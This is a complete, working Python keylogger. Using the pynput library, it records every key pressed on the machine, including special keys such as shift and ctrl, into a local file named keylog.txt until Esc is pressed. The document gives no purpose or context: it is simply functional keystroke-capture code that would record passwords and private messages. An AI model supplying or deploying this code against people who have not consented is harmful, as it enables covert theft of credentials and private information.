import os
from pynput import keyboard

def write_to_log(key):
    try:
        # Ensure the log file exists, create it if it doesn't
        if not os.path.exists("keylog.txt"):
            with open("keylog.txt", 'w') as log_file:
                pass

        with open("keylog.txt", 'a') as log_file:
            # Check if the pressed key is a printable character
            if hasattr(key, 'char'):
                if key.char:
                    log_file.write(key.char)
            else:
                # If the pressed key is a special key (e.g., shift, ctrl), record its name
                special_key = str(key).split('.')[1]
                log_file.write(f"<{special_key}>")
    except Exception as e:
        print(f"Error: {str(e)}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if the escape key is pressed
        return False

def main():
    with keyboard.Listener(on_press=write_to_log, on_release=on_release) as listener:
        # Keep the program running until the escape key is pressed
        listener.join()

if __name__ == "__main__":
    main()
